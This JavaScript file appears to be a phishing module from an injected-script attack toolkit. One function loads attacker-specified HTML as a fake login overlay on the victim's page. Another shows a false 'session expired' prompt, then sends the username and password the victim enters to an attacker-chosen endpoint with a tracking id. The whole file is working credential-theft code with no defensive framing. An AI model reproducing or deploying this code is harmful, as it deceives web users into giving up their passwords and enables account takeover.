function fake_login_html(html_path) {
    $.get(html_path, function (data) {
        // Load bootstrap
        const bootstrap_css = document.createElement('link');
        bootstrap_css.rel = "stylesheet";
        bootstrap_css.href = "https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css";
        bootstrap_css.crossOrigin = "anonymous";
        document.head.appendChild(bootstrap_css);
        const bootstrap_optional = document.createElement('link');
        bootstrap_optional.rel = "stylesheet";
        bootstrap_optional.href = "https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css";
        bootstrap_optional.crossOrigin = "anonymous";
        document.head.appendChild(bootstrap_optional);
        const bootstrap_js = document.createElement('script');
        bootstrap_js.src = "https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js";
        bootstrap_js.type = "text/javascript";
        bootstrap_js.addEventListener('load', () => { });
        document.head.appendChild(bootstrap_js);

        setTimeout(function () {
            // Load login_html from attacker specified URL
            const fake_login_elmt = document.createElement("div");
            fake_login_elmt.innerHTML = data;
            fake_login_elmt.id = "fake_login_div";
            fake_login_elmt.style = "text-align: center; position: fixed; width: 100%";
            document.body.appendChild(fake_login_elmt);
        }, 1000);
    });
}

function fake_login_prompt(fireId, endpoint){
    var usrnm = prompt("Your session expired. Enter your username/email");
    var paswd = prompt("Enter your password");
    $.ajax({
        type: "POST",
        url: endpoint,
        data: {
            fire_id: fireId,
            username: usrnm,
            password: paswd
        },
        dataType: "html",
    });
}
